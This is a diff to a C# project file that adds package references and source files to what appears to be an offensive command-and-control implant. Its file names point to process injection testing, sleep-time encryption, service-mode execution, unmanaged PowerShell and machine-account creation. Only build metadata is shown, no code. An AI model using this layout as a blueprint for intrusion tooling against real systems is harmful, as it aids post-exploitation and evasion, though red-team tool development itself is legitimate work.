@@ -75,12 +75,16 @@
   </PropertyGroup>
   <ItemGroup>
     <Reference Include="Microsoft.IdentityModel.Clients.ActiveDirectory, Version=5.2.8.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL" />
+    <Reference Include="mscorlib" />
     <Reference Include="NetSerializer, Version=4.1.2.0, Culture=neutral, processorArchitecture=MSIL">
       <HintPath>..\packages\NetSerializer.4.1.2\lib\net45\NetSerializer.dll</HintPath>
     </Reference>
     <Reference Include="System" />
     <Reference Include="Microsoft.CSharp" />
     <Reference Include="System.Configuration" />
+    <Reference Include="System.Diagnostics.EventLog, Version=7.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Diagnostics.EventLog.7.0.0\lib\net462\System.Diagnostics.EventLog.dll</HintPath>
+    </Reference>
     <Reference Include="System.DirectoryServices" />
     <Reference Include="System.DirectoryServices.AccountManagement" />
     <Reference Include="System.DirectoryServices.Protocols" />
@@ -93,11 +97,19 @@
     <Reference Include="System.Net.Http" />
     <Reference Include="System.Numerics" />
     <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security.Principal.Windows, Version=5.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Principal.Windows.5.0.0\lib\net461\System.Security.Principal.Windows.dll</HintPath>
+    </Reference>
     <Reference Include="System.ServiceModel" />
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.ServiceProcess.ServiceController, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.ServiceProcess.ServiceController.7.0.0\lib\net462\System.ServiceProcess.ServiceController.dll</HintPath>
+    </Reference>
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Commands\Add-MachineAccount.cs" />
+    <Compile Include="Commands\AddCommand.cs" />
     <Compile Include="Commands\arp.cs" />
     <Compile Include="Commands\CancelTask.cs" />
     <Compile Include="Commands\Cat.cs" />
@@ -148,16 +160,21 @@
     <Compile Include="Commands\TestCommand.cs" />
     <Compile Include="Commands\Exit.cs" />
     <Compile Include="Commands\UnManagedPowershell.cs" />
+    <Compile Include="Commands\UpdateTaskKey.cs" />
     <Compile Include="Commands\Upload.cs" />
     <Compile Include="Commands\WhoAmI.cs" />
     <Compile Include="Extensions.cs" />
     <Compile Include="Extra\EngineerCommandTemplate.cs" />
     <Compile Include="Extra\h_reprobate.cs" />
     <Compile Include="Extra\reprobate.cs" />
+    <Compile Include="Extra\ServiceExeMode.cs">
+      <SubType>Component</SubType>
+    </Compile>
     <Compile Include="Extra\WinApiDynamicDelegate.cs" />
     <Compile Include="Extra\WinAPIs.cs" />
     <Compile Include="Functions\DownloadTracker.cs" />
     <Compile Include="Functions\Encryption.cs" />
+    <Compile Include="Functions\InjectionTest.cs" />
     <Compile Include="Functions\SharpSleepEncryption.cs" />
     <Compile Include="Functions\SleepEncrypt.cs" />
     <Compile Include="Functions\Sleepydll.cs" />
